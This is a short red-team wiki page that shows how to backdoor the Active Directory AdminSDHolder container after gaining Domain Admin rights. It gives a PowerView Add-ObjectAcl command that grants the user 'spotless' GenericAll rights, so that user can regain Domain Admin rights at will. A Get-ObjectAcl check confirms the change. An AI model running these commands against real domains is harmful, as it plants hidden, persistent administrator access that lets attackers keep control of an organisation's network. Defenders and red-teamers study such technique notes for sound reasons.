# Backdooring AdminSDHolder for Persistence

## AdminSDHolder

AdminSDHolder is a special AD container with security permissions that is used as a template on other protected AD accounts and groups to prevent accidental and unintended modifications of high privileged accounts and groups like `Domain Admins`. 

Once you have agained Domain Admin privileges, AdminSDHolder can be abused by backdooring it by adding your backdoor user and giving it `GenericAll` privileges, which in turn allows the backdoored user to obtain DA rights whenever.

## Execution

Backdooring the AdminSDHolder container by adding an ACL that provides user `spotless` with `GenericAll` rights for `Domain Admins` group:

```csharp
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName spotless -Verbose -Rights All
```

![](../../.gitbook/assets/screenshot-from-2018-12-20-20-21-53.png)

This is actually what happens to the container:

![](../../.gitbook/assets/screenshot-from-2018-12-20-20-24-32.png)

Confirming that the user spotless has now GenericAll privileges against `Domain Admins` group:

```csharp
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

## References

{% embed url="http://www.harmj0y.net/blog/redteaming/abusing-active-directory-permissions-with-powerview/" %}

